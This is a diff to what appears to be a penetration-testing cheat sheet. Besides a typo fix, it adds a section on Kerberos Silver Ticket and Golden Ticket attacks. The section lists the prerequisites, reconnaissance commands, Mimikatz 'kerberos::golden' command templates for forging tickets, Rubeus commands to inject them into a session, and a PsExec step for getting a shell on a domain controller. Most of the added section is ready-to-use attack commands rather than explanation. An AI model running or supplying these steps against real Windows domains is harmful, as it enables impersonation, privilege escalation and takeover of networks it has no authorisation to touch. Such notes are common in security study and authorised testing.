@@ -39,7 +39,7 @@ Extracts files hidden in pictures, pretty good for stegonograpy.
 
 * `dig +short myip.opendns.com @resolver1.opendns.com`
 
-* `curl ifconfig.me` a simpler way is just wisiting ifconfig.me with curl :)
+* `curl ifconfig.me` a simpler way is just visiting ifconfig.me with curl :)
 
 ## curl
 You can do some great things with **_curl_**, it's worth going through it's man page, this is one of the great techniques I use quite often:
@@ -87,6 +87,43 @@ So let's say you have to crack a password that's from a website that uses just a
 If a lowercase letter “l” appears in the group’s execute field, means that the setgid bit is on, and the execute bit for the group is off or denied.
 
 * `find / -perm +6000 2>/dev/null | grep '/bin/'` only use grep if you need it or looking for a very specific location
+
+## Silver Ticket and Golden Ticket
+
+* **Silver Ticket attack**
+* needed:
+* Domain security identifier (SID)
+* Domain fully qualified domain name (FQDN)
+* Service account's password hash
+* Username to impersonate
+* Service name
+* Target
+* `whoami /user`
+* get SID
+* `systeminfo | findstr /B /C:"Domain"`
+* get FQDN
+* `setspn -L <service account name>`
+* get service, ex.: HTTP/worktation-02.krbtown.local
+* service is HTTP
+* creating the ticket with Mimikatz:
+* `kerberos::golden /sid:<SID (remove last 4 digits after dash)> /domain:<Domain FQDN> /user:<user to impersonate (need user's hash too at the end)> /service:<service we are trying to connect to, in our example is HTTP> /target:<The target server (workstation-02.krbtown.local)> /rc4:<the password hash of the service account in our case Administrator>`
+* Mimikatz will save the output as ticket.kirbi
+* using Rubeus to lead the ticket into our current session:
+* `Rubeus.exe ptt /ticket:ticket.kirbi`
+* now we can connect to the iis_service from this session
+* **Golden Ticket attack**
+* needed:
+* Domain SID
+* Domain FQDN
+* KRBTGT's password hash
+* Username to impersonate
+* `whoami /user`
+* `systeminfo | findstr /B /C:"Domain"`
+* The KRBTGT's password hash can only be dumped after becoming domain administrator and either performing a password dump on the DC, a DYNSync attack or a shadow copy on the DC. The user to impersonate can be any user of the domain even a non existing one with administrator RID.
+* `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>`
+* load the kreated ticket into memory and then use psexec to get a shell on the target machine
+* `Rubeus.exe ptt /ticket:ticket.kirbi`
+* `PsExec.exe \\dc01.krbtown.local cmd`
 
 ## fping
 Helps you to ping a range of IP addresses.
